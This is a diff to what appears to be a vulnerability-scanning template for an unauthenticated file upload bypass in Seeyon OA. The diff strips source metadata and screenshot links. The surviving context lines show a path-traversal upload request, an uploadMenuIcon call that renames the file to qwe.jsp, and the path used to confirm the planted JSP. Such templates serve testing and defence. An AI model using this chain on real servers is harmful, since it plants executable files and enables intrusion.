@@ -3,13 +3,8 @@ info:
   name: 致远互联-OA 前台fileUpload.do 绕过文件上传
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/isr8f9oln3aqf847
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: isr8f9oln3aqf847
 http:
 - raw:
   - 'POST /seeyon/autoinstall.do/../../seeyon/fileUpload.do?method=processUpload HTTP/1.1
@@ -90,7 +85,7 @@ http:
     --00content0boundary00--
 
 
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1717058410420-ccac5c27-f5da-4a7c-903e-953847501b6b.png)4、上传图片获取fileid值'
+    4、上传图片获取fileid值'
   redirects: false
   matchers:
   - status:
@@ -115,16 +110,10 @@ http:
     method=uploadMenuIcon&fileid=获取到的值&filename=qwe.jsp
 
 
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1717058410690-cf7f527f-d68d-4c22-81ce-c08d900e191f.png)
-
-
     1. 验证
 
 
     /seeyon/main/menuIcon/qwe.jsp
-
-
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1717058410878-45827824-81ad-4d61-b209-c9c0c80f524e.png)
 
 
     ## 修复建议
